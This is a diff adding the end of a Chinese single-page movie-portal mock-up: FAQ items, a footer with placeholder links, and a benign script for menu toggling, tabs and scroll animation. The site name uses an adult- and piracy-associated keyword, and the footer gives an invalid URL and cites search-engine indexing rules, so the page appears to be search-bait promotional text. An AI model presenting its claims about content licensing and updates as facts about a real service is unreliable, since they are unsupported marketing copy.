+        <div class="a">一样。本站采用响应式布局，手机端导航自动折叠为菜单按钮，海报网格与榜单自动重排，所有栏目链接均已配置跳转锚点，不会出现排版错乱。</div>
+      </details>
+      <details class="rv">
+        <summary>片单多久更新一次？</summary>
+        <div class="a">热榜每日更新，编辑精选榜每周更新，影讯与上映档期按周同步，重大新片上线会在首页第一时间置顶。</div>
+      </details>
+      <details class="rv">
+        <summary>为什么有些影片搜不到或提示下架？</summary>
+        <div class="a">影视内容的版权授权受地区与时间限制，平台会随授权变化同步更新片库并标注"已下架"，同时推荐同类型可替代的作品。</div>
+      </details>
+    </div>
+  </section>
+
+</main>
+
+<footer class="wrap" id="about">
+  <div class="ft">
+    <div>
+      <div class="logo"><span class="orb" aria-hidden="true"><span>天</span></span>av天堂电影网</div>
+      <p>avtiantangdianyingwang-wap 聚合全网热播影视与短剧内容，用编辑筛选代替无休止的翻找，让每一次打开都有得看、看完不后悔。</p>
+    </div>
+    <div>
+      <h4>内容栏目</h4>
+      <ul>
+        <li><a href="#films">电影大片</a></li>
+        <li><a href="#series">热播剧集</a></li>
+        <li><a href="#cats">频道分类</a></li>
+        <li><a href="#rank">热度榜单</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>频道入口</h4>
+      <ul>
+        <li><a href="#">电影频道</a></li>
+        <li><a href="#">综艺娱乐</a></li>
+        <li><a href="#">动漫番剧</a></li>
+        <li><a href="#">短剧精选</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>帮助与支持</h4>
+      <ul>
+        <li><a href="#reviews">影评专栏</a></li>
+        <li><a href="#faq">常见问题</a></li>
+        <li><a href="#">访问建议</a></li>
+        <li><a href="#">反馈意见</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="copy">
+    <span>© 2026 av天堂电影网 · 网址：https://avtiantangdianyingwang-wap · 本站为单页演示作品，栏目内链以 # 占位</span>
+    <span>遵循必应搜索引擎收录规范：唯一规范网址、完整标签闭合、移动端自适应</span>
+  </div>
+</footer>
+
+<script>
+  var btn = document.getElementById('menuBtn');
+  var nav = document.getElementById('nav');
+  btn.addEventListener('click', function () { nav.classList.toggle('open'); });
+  nav.addEventListener('click', function (e) {
+    if (e.target.tagName === 'A' && window.innerWidth <= 900) nav.classList.remove('open');
+  });
+  var tabs = document.querySelectorAll('.tab');
+  tabs.forEach(function (t) {
+    t.addEventListener('click', function () {
+      tabs.forEach(function (x) { x.classList.remove('on'); });
+      t.classList.add('on');
+      document.querySelectorAll('.tabpane').forEach(function (p) { p.classList.remove('on'); });
+      var pane = document.getElementById('pane-' + t.dataset.t);
+      if (pane) pane.classList.add('on');
+    });
+  });
+  var items = document.querySelectorAll('.rv');
+  if ('IntersectionObserver' in window) {
+    var io = new IntersectionObserver(function (es) {
+      es.forEach(function (e) {
+        if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); }
+      });
+    }, { threshold: 0.12 });
+    items.forEach(function (el) { io.observe(el); });
+  } else {
+    items.forEach(function (el) { el.classList.add('in'); });
+  }
+</script>
+</body>
+</html>
